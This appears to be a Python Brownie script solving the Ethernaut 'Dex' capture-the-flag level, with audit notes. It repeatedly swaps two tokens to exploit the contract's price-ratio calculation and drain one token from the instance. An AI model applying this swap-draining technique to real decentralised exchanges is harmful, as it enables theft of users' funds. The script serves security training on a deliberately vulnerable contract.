from os import TMP_MAX
from scripts.helpful_scripts import get_account
from brownie import web3, interface, convert, Dex
from eth_utils import keccak

from scripts.sandbox import print_balances


ETHERNAUT_INSTANCE = "0x058e398CDDc4D1756B5A5BE52F6D9f1c7F0a3D61"

TOKEN1 = "0x1e292F2B859BED4E973161d157ee424dC05C2f51"
TOKEN2 = "0xcA813159f75fC1bF890e139C647fa36aceA540aA"

GAS_LIMIT = 12000000


def balances(_target):
    balance1 = _target.balanceOf(TOKEN1, ETHERNAUT_INSTANCE)
    balance2 = _target.balanceOf(TOKEN2, ETHERNAUT_INSTANCE)
    print(f"\nIteration: balance 1 = {balance1}, balance 2 = {balance2}\n")


def main():
    player = get_account()
    # target = interface.IDex(ETHERNAUT_INSTANCE)
    target = Dex.at(ETHERNAUT_INSTANCE)
    token1 = interface.IERC20(target.token1())
    token2 = interface.IERC20(target.token2())
    token1.approve(ETHERNAUT_INSTANCE, 1000, {"from": player})
    token2.approve(ETHERNAUT_INSTANCE, 1000, {"from": player})
    print(f"player balance token_1 = {token1.balanceOf(player)}")
    print(f"player balance token_2 = {token2.balanceOf(player)}")

    token_to = token1
    token_from = token2

    price = target.getSwapPrice(
        token_from,
        token_to,
        token_from.balanceOf(player),
        {"from": player, "gas_limit": GAS_LIMIT, "allow_revert": True},
    )
    print(f"\nprice = {price}\n")

    ###############################################################################
    # Swap loop
    ###############################################################################
    while price <= token_from.balanceOf(target):
        target.swap(
            token_from,
            token_to,
            token_from.balanceOf(player),
            {"from": player, "gas_limit": GAS_LIMIT},
        )
        balances(target)
        print(f"player balance token_1 = {token1.balanceOf(player)}")
        print(f"player balance token_2 = {token2.balanceOf(player)}")

        # toggle tokens
        temp = token_to
        token_to = token_from
        token_from = temp
        # get price for next swap
        price = target.getSwapPrice(
            token_from,
            token_to,
            token_from.balanceOf(player),
            {"from": player, "gas_limit": GAS_LIMIT, "allow_revert": True},
        )
        print(f"\nprice = {price}\n")

    ###############################################################################

    amount = int(token_from.balanceOf(player) * token_to.balanceOf(target) / price)
    price = target.getSwapPrice(token_from, token_to, amount)
    target.swap(token_from, token_to, amount, {"from": player})
    balances(target)
    print(f"player balance token_1 = {token1.balanceOf(player)}")
    print(f"player balance token_2 = {token2.balanceOf(player)}")


"""
        Script steps:
        
        1) set player account
        2) define target interface (Dex contract)
        3) define token1 and token2
        4) approve token1 and token2
        
        5) assign token_to and tokenFrom (so you can toggle them)
            5a. assign token_to / tokenFrom
        
        6) get swap_price

        7) while swap_price < tokenFrom.balanceOf(target)
            8a. perform swap
            8b. toggle to/from
            8c. get swap_price

        8) manually perform the final swap to drain the funds
                        
    ===================================================================

    Audit notes:

        1. Dex contract
            - storage slot 0, 1, 2 -> contain addresses
        2. SwappableToken contract
            - we can ignore this as the approve method is included
              in the Dex contract (for ease)
        3. Function swap() is where the token transfer happens
       
        4. Swap price calculation
        
            - (amount * 'to' price) / ('from' price)
                so: swap price == amount * (token ratio)
    
        5. Swap process ->

            - see 22-simulate_target.py (this models the swap process)
        
        6. We can beat this level with Python and an IDex interface

"""
